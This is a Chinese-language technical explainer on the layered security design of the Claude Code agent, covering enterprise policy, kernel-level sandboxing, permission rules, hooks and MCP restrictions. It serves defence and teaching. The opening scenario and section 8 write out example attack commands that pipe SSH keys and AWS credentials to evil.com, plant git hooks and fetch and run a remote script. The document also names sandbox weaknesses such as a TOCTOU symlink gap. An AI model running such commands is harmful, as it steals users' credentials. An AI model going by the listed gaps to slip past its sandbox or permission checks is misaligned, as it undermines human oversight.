# Part 10: 安全体系 — 从 OS 内核到应用层的纵深防御

> 你给了 Claude Code 读写文件和执行命令的权限。如何确保它不会：
> 读取你的 SSH 密钥？向恶意网站发送数据？在 git hooks 里植入后门？
> 答案是七层纵深防御。

---

## 开场：一个恐怖场景

你让 Claude Code 安装一个 npm 包。包里有恶意的 `postinstall` 脚本：

```bash
# 恶意 postinstall 脚本
cat ~/.ssh/id_rsa | curl https://evil.com/steal       # 偷 SSH 密钥
echo "恶意代码" > .git/hooks/pre-commit               # 植入后门
cat ~/.aws/credentials >> /tmp/leaked                  # 泄露 AWS 凭证
```

如果没有防护，这三行全部成功执行。你的 SSH 密钥、AWS 凭证、git 仓库全部被攻陷。

Claude Code 怎么防御这个？

---

## 1. 全景：七层约束体系

```
┌─────────────────────────────────┐
│  Layer 7: 企业策略               │  ← managed-settings.json，最高优先级
│         (Managed Policy)         │
├─────────────────────────────────┤
│  Layer 6: 沙箱                   │  ← OS 内核级隔离，网络+文件系统
│         (Sandbox)                │
├─────────────────────────────────┤
│  Layer 5: 权限模式 + 规则        │  ← 工具级 allow/deny/ask
│         (Permission System)      │
├─────────────────────────────────┤
│  Layer 4: Hook 系统              │  ← 27 种事件的确定性拦截
│         (Hook System)            │
├─────────────────────────────────┤
│  Layer 3: MCP 服务器限制         │  ← 外部工具连接白/黑名单
│         (MCP Restrictions)       │
├─────────────────────────────────┤
│  Layer 2: CLAUDE.md 指令         │  ← 自然语言行为约束
│         (Instructions)           │
├─────────────────────────────────┤
│  Layer 1: Agent 级约束           │  ← 子代理工具/轮次限制
│         (Agent Constraints)      │
└─────────────────────────────────┘
```

**[核心概念] 纵深防御（Defense in Depth）。** 不指望任何单一层面能阻止所有攻击。每一层处理一类风险，即使某层被突破，下一层还能兜住。

---

## 2. Layer 7: 企业策略 — 管理员的绝对权力

**位置**：`managed-settings.json`，最高优先级，覆盖所有其他设置。

| 策略开关 | 作用 |
|---------|------|
| `allowManagedHooksOnly` | 只允许管理员配置的 hook |
| `allowManagedPermissionRulesOnly` | 只使用管理员的权限规则 |
| `allowManagedMcpServersOnly` | 只能连接管理员批准的 MCP 服务器 |
| `strictPluginOnlyCustomization` | 锁定为只能通过插件定制 |
| `strictKnownMarketplaces` | 限定管理员批准的插件市场 |
| `blockedMarketplaces` | 屏蔽特定来源 |
| `disableBypassPermissionsMode: 'disable'` | 禁止 bypass 模式 |
| `disableAutoMode: 'disable'` | 禁止分类器自动审批 |

**[设计决策] 企业策略覆盖一切。** 即使用户在自己的 `settings.json` 里配了 `bypassPermissions`，企业的 `disableBypassPermissionsMode` 也会阻止。这是"管理员永远赢"的设计。

---

## 3. Layer 6: 沙箱 — OS 内核级隔离

### 3.1 核心理解：沙箱限制的是什么

**沙箱不是限制 Claude Code 进程本身，而是限制 Claude 通过 Bash 执行的每一条命令。**

```
你给 Claude Code 的权限（读写文件、执行命令）
        │  这层权限让 Claude Code 进程能运行
        ▼
Claude 决定执行: npm install some-malicious-package
        │  沙箱在这里介入 ↓
        ▼
┌──────────────────────────────┐
│  sandbox-exec / bwrap 包裹    │  ← 命令在受限环境里跑
│  - 不能访问 ~/.ssh            │
│  - 不能访问 ~/.aws            │
│  - 不能连外网（除白名单）      │
│  - 不能写 .git/hooks          │
└──────────────────────────────┘
```

你给的"本地权限"是让 Claude Code 能运行。沙箱确保它运行的东西**不会越界**。两者不矛盾。

### 3.2 命令包装机制

你以为执行的是：
```bash
npm install express
```

**macOS 上实际执行的是：**
```bash
sandbox-exec -p '(version 1)
  (deny default)
  (allow file-read* (subpath "/Users/you/project"))
  (deny file-write* (subpath "/Users/you/.ssh"))
  (deny network-outbound)
  ...' /bin/bash -c 'npm install express'
```

**Linux 上实际执行的是：**
```bash
bwrap --new-session --die-with-parent \
  --unshare-net \
  --ro-bind / / \
  --bind /Users/you/project /Users/you/project \
  --tmpfs /Users/you/.ssh \
  -- apply-seccomp /bin/bash -c 'npm install express'
```

### 3.3 平台实现对比

| | macOS | Linux |
|--|-------|-------|
| 核心技术 | **Apple Seatbelt**（`sandbox-exec`） | **Bubblewrap** (`bwrap`) + **seccomp-bpf** |
| 提供方 | macOS 内核自带 | 第三方（需安装） |
| 隔离层级 | MAC（Mandatory Access Control）| namespace + syscall 过滤 |
| 文件限制 | Seatbelt profile deny/allow | bind mount 只读 + tmpfs 遮盖 |
| 网络限制 | 拦截 `network-outbound` mach 服务 | `--unshare-net` 完全移除网络接口 |
| 关键点 | **OS 自带，零依赖** | 需安装 bubblewrap |

### 3.4 macOS Seatbelt 详解

Seatbelt 是 Apple 的 MAC 框架，App Store 应用沙箱和 Chrome 进程隔离都基于它。

**动态生成的 Seatbelt Profile：**

```lisp
(version 1)
(deny default)                              ; 白名单模式：默认拒绝一切

;; 文件读取
(allow file-read*
  (subpath "/Users/you/project")            ; 允许读项目目录
  (subpath "/usr/lib")                       ; 允许读系统库
  (subpath "/tmp"))                          ; 允许读临时目录

;; 文件写入
(allow file-write*
  (subpath "/Users/you/project"))            ; 只允许写项目目录
(deny file-write*
  (subpath "/Users/you/project/.git/hooks")) ; 但 .git/hooks 禁写

;; 网络
(deny network-outbound)                     ; 禁止所有出站网络

;; 进程/IPC
(allow mach-lookup ...)                     ; 限制可用的系统服务
(allow pseudo-tty)                          ; 允许 PTY（终端需要）
```

**[核心概念] Seatbelt 在内核级执行。** 即使命令获得了 root 权限也无法绕过。这和用户态的文件权限检查完全不同。

### 3.5 Linux 三阶段包装

```
Stage 1: bwrap（namespace 隔离）
  ├─ --unshare-net         → 新的网络 namespace（无网络接口）
  ├─ --unshare-pid         → 新的 PID namespace
  ├─ --ro-bind / /         → 根目录只读挂载
  ├─ --bind <project> ...  → 项目目录可写挂载
  ├─ --tmpfs ~/.ssh        → 敏感目录用空 tmpfs 遮盖
  └─ socat 桥接            → 白名单网络访问的 socket 代理
           │
Stage 2: apply-seccomp（syscall 过滤）
  ├─ PR_SET_NO_NEW_PRIVS   → 不允许提权
  ├─ seccomp-bpf 过滤器    → 阻止 socket(AF_UNIX) syscall
  └─ 预编译 BPF 字节码     → 支持 x64 和 arm64
           │
Stage 3: 实际命令执行
  └─ /bin/bash -c 'npm install express'
```

### 3.6 永远禁写的路径（hardcoded，无法覆盖）

```
.git/hooks              ← 防注入恶意 git hook
.git/config             ← 防改 git 配置（除非 allowGitConfig）
.claude/settings.json   ← 防 Claude 修改自身权限
.claude/settings.local.json
~/.ssh                  ← 防泄露/篡改 SSH 密钥
~/.aws                  ← 防泄露 AWS 凭证
~/.npmrc                ← 防泄露 npm token
.env                    ← 防泄露环境变量
package-lock.json       ← 防供应链攻击
pnpm-lock.yaml          ← 同上
```

**[设计决策] 为什么 package-lock.json 也禁写？** 因为 lockfile 固定了依赖版本和下载源。如果恶意代码修改了 lockfile，下次 `npm install` 可能从恶意源下载篡改过的包。这是供应链攻击的经典手法。

### 3.7 网络隔离

```
默认: 完全断网
        │
settings.json 配置白名单域名
  sandbox.network.allowedDomains: ["registry.npmjs.org", "github.com"]
        │
Claude Code 启动 HTTP/SOCKS 代理
  ├─ macOS: 本地端口代理
  └─ Linux: Unix socket + socat 桥接到沙箱内
        │
命令内网络请求 → 代理 → 域名匹配
  ├─ 匹配白名单 → 放行
  ├─ 匹配黑名单 → 拒绝（黑名单优先）
  └─ 无匹配 → 拒绝（或询问用户）
```

域名匹配支持通配符：`*.example.com` 匹配所有子域名但不匹配 `example.com` 本身。

### 3.8 开场恐怖场景的防御效果

```
无沙箱：
  npm install cool-package → postinstall:
    cat ~/.ssh/id_rsa | curl evil.com  → 凭证泄露 ✗
    echo > .git/hooks/pre-commit       → 后门注入 ✗
    cat ~/.aws/credentials             → AWS 泄露 ✗
  全部成功

有沙箱：
  npm install cool-package → postinstall:
    cat ~/.ssh/id_rsa    → 内核拒绝：tmpfs 遮盖 / Seatbelt deny ✓
    curl evil.com        → 内核拒绝：网络隔离 / 代理无此域名 ✓
    echo > .git/hooks    → 内核拒绝：hardcoded deny 路径 ✓
  恶意行为全部阻断
  npm install 本身正常（registry.npmjs.org 在白名单）
```

### 3.9 沙箱配置结构

```json
{
  "sandbox": {
    "enabled": true,
    "failIfUnavailable": true,
    "network": {
      "allowedDomains": ["registry.npmjs.org", "github.com"],
      "allowManagedDomainsOnly": false,
      "allowLocalBinding": true
    },
    "filesystem": {
      "allowWrite": ["."],
      "denyWrite": [".git/hooks", ".ssh", ".aws"],
      "denyRead": [".env.production"],
      "allowRead": []
    },
    "excludedCommands": ["docker"],
    "autoAllowBashIfSandboxed": false
  }
}
```

### 3.10 命令包装的代码流程

```
用户命令输入
    │
    ▼
shouldUseSandbox() 检查
  ├─ sandbox.enabled = true?
  ├─ dangerouslyDisableSandbox 标志?
  ├─ 命令在 excludedCommands 列表中?
  └─ 任一为否 → 跳过沙箱
    │
    ▼ (需要沙箱)
BashTool.tsx → exec(command, { shouldUseSandbox: true })
    │
    ▼
Shell.ts → SandboxManager.wrapWithSandbox(commandString)
    │
    ├─ macOS: generateSandboxProfile() → Seatbelt LISP
    └─ Linux: wrapCommandWithSandboxLinux() → bwrap + seccomp
    │
    ▼
spawn(/bin/sh, ['-c', wrappedCommand])
```

### 3.11 沙箱的局限

- Seccomp-bpf 不支持 32 位 x86（socketcall syscall 无法精确过滤）
- 嵌套沙箱需要特殊处理（`enableWeakerNestedSandbox`）
- Symlink 在 mount 时检查，存在 TOCTOU 窗口
- Linux Bubblewrap 需要额外安装

---

## 4. Layer 5: 权限模式与规则

### 4.1 六种权限模式

| 模式 | 行为 | 适用场景 |
|------|------|---------|
| `default` | 敏感操作询问用户 | 日常使用 |
| `acceptEdits` | 自动接受文件编辑 | 信任 Claude 的编辑能力 |
| `bypassPermissions` | 跳过所有检查 | 自动化场景（危险） |
| `dontAsk` | 纯靠 allow/deny 规则 | CI/CD |
| `plan` | 只读，禁止写操作 | 规划阶段 |
| `auto` | AI 分类器自动审批 | 半自动 |

### 4.2 权限规则

```json
{
  "permissions": {
    "allow": ["Edit", "Bash(npm test)", "Bash(git *)"],
    "deny": ["Bash(rm -rf *)", "Bash(sudo *)"],
    "ask": ["Bash(git push *)"]
  }
}
```

支持通配符。规则来自 5 个源（优先级递减）：
1. policySettings — managed-settings.json
2. flagSettings — CLI `--allow-tools`
3. localSettings — `.claude/settings.local.json`
4. projectSettings — `.claude/settings.json`
5. userSettings — `~/.claude/settings.json`

### 4.3 权限决策的 11 种来源

```
rule, mode, hook, classifier, sandboxOverride,
safetyCheck, workingDir, subcommandResults,
permissionPromptTool, asyncAgent, other
```

**[可借鉴] 每个权限决策都带"来源"标签。** 这让审计变得容易——你可以追踪"这个 Bash 命令被允许是因为 hook 决策还是 allow 规则？"

---

## 5. Layer 3: MCP 服务器限制

```json
{
  "allowedMcpServers": [{ "serverName": "github" }, { "serverUrl": "https://api.internal.com/*" }],
  "deniedMcpServers": [{ "serverUrl": "*.evil.com" }],
  "allowManagedMcpServersOnly": false
}
```

匹配规则：serverName 精确匹配、serverCommand 精确数组匹配、serverUrl 通配符匹配。**黑名单优先于白名单。**

---

## 6. Layer 2: CLAUDE.md 指令

自然语言约束，确定性 ~90%：

```markdown
# CLAUDE.md
- 使用 pnpm 而不是 npm
- 提交前必须跑 lint
- 不要修改 migrations/ 目录下的文件
- 所有新文件必须有单元测试
```

通过 `InstructionsLoaded` hook 可在加载后做额外处理。

---

## 7. Layer 1: Agent 级约束

```yaml
# .claude/agents/my-agent.md frontmatter
tools: [Read, Grep, Glob]           # 只允许这些工具
disallowedTools: [Bash, Write]      # 禁止这些工具
maxTurns: 10                         # 最大轮次
permissionMode: plan                 # 只读
model: claude-haiku-4-5-20251001    # 更便宜的模型
isolation: worktree                  # 隔离 worktree
hooks: { ... }                       # 专属 hook
mcpServers: [...]                    # 专属 MCP
```

---

## 8. 七层协作的完整防御链

**场景：Claude 执行 `curl https://evil.com/malware.sh | bash`**

```
Layer 2 (CLAUDE.md)    : "不要执行从网络下载的脚本" → 模型可能遵循，可能不遵循
Layer 5 (Permission)   : Bash(curl *) 不在 allow 规则 → 弹窗询问用户
Layer 4 (Hook)         : PreToolUse 检测到 curl|bash 模式 → exit 2 阻止
Layer 6 (Sandbox)      : 即使前面都通过了：
                         curl → 网络隔离，evil.com 不在白名单 → 失败
                         bash → 下载的脚本无法执行写操作
Layer 7 (Enterprise)   : 如果管理员配了 allowManagedHooksOnly
                         → 只有管理员的 hook 生效
```

**每一层都独立防御，不依赖其他层。** 即使 CLAUDE.md 被忽略、权限被绕过、hook 被跳过，沙箱在内核级仍然阻止。

---

## 9. 设计哲学分析

### 9.1 为什么需要七层而不是只要沙箱？

```
只有沙箱的问题：
  ✅ 阻止了恶意操作
  ❌ 用户体验差——合法操作也可能被阻止，需要频繁配置白名单
  ❌ 无法区分"这是用户想要的"和"这是模型自作主张的"
  ❌ 沙箱是最后手段，频繁触发意味着前面的层面失效

七层的价值：
  Layer 2/4/5 在沙箱之前就处理了大部分场景
  沙箱只处理"真正绕过了所有前面层面"的极端情况
  用户体验更好——大部分操作被更友好的权限弹窗处理
```

### 9.2 确定性层 vs 概率性层

```
确定性层（100%）：Layer 1/3/4/5/6/7
  → 配置了就一定生效，不依赖模型行为
  → 用于安全关键的硬性约束

概率性层（~90%）：Layer 2 (CLAUDE.md)
  → 依赖模型理解和遵循
  → 用于偏好引导、编码风格等软性约束
```

**[可借鉴] 安全约束用确定性层，偏好引导用概率性层。** 不要把安全关键的规则（如"不允许执行 DROP TABLE"）放在 CLAUDE.md 里。

---

## 10. 常见误区

### 误区 1："给了 Claude Code 本地权限就不安全了"

你给的权限让 Claude Code 进程能运行。沙箱确保它运行的命令在受限环境里。两者不矛盾。

### 误区 2："沙箱会让开发体验变差"

沙箱是透明的。正常的 `npm install`、`git push`、`make build` 都正常工作（因为相关域名和目录在白名单里）。只有恶意行为被阻止。

### 误区 3："auto 模式很危险"

auto 模式用 AI 分类器判断命令安全性，不是"自动允许所有操作"。分类器会拒绝危险命令。而且企业可以用 `disableAutoMode` 禁止 auto 模式。

### 误区 4："Hook 能替代沙箱"

Hook 运行在用户态，可以被恶意命令绕过（比如 hook 脚本本身被修改）。沙箱运行在内核态，无法从用户态绕过。两者防御不同层面的威胁。

---

## 11. 跨模块联系

| 涉及 | 详见 |
|------|------|
| BashTool 的 shouldUseSandbox 判断 | **Part 5: Tool 系统** — BashTool 深度解析 |
| Hook 的 27 种事件详解 | **Part 9: 生态扩展** — Hook 机制 |
| Agent 的工具隔离 | **Part 6: Agent 架构** — 工具池组装 |
| MCP 服务器连接限制 | **Part 9: 生态扩展** — MCP 生命周期 |

---

## 12. 核心 Takeaway

1. **纵深防御**：七层独立防御，每层处理一类风险，不依赖其他层。
2. **沙箱在内核级执行**——macOS Seatbelt 和 Linux bubblewrap + seccomp 无法从用户态绕过。
3. **确定性层 vs 概率性层**——安全约束用 harness/kernel 级，偏好引导用 prompt 级。
4. **企业策略覆盖一切**——managed-settings.json 是最高优先级。
5. **供应链防御**：lockfile 禁写、网络隔离、敏感路径 hardcoded deny。

---

## 13. 思考题

1. **如果你在设计一个 coding agent 的沙箱，你会选择白名单还是黑名单？** 白名单更安全但可能遗漏合法操作，黑名单更宽松但可能遗漏攻击向量。
2. **TOCTOU（Time of Check, Time of Use）攻击在沙箱中的风险有多大？** 如果 symlink 在 mount 检查后被替换指向敏感文件，沙箱还能防御吗？
3. **如果恶意 npm 包的 postinstall 不是 shell 命令，而是 Node.js 代码（直接调 `fs.readFileSync` 和 `http.request`），沙箱还能防御吗？** 提示：考虑 Node.js 进程是否在沙箱内。
4. **七层防御的"最弱环节"是哪一层？** 如果你只能加强一层，你会选哪个？

---

## 关键源文件

| 文件 | 职责 |
|------|------|
| `src/utils/sandbox/sandbox-adapter.ts` | 配置转换 |
| `src/tools/BashTool/shouldUseSandbox.ts` | 沙箱判断逻辑 |
| `src/utils/Shell.ts` | 命令执行入口 |
| `node_modules/@anthropic-ai/sandbox-runtime/dist/sandbox/sandbox-manager.js` | 沙箱编排器 |
| `node_modules/@anthropic-ai/sandbox-runtime/dist/sandbox/macos-sandbox-utils.js` | Seatbelt profile |
| `node_modules/@anthropic-ai/sandbox-runtime/dist/sandbox/linux-sandbox-utils.js` | bwrap + seccomp |
